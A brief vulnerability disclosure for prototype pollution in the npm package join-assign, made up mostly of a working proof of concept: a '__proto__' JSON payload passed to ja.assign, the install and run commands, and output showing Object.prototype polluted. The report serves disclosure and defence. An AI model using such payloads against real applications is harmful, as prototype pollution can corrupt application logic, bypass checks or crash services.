# Description

Prototype Pollution in join-assign

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
const ja = require('join-assign')
const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}');
var obj = {}
console.log("Before : " + {}.polluted);
ja.assign(obj, payload);
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i join-assign # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
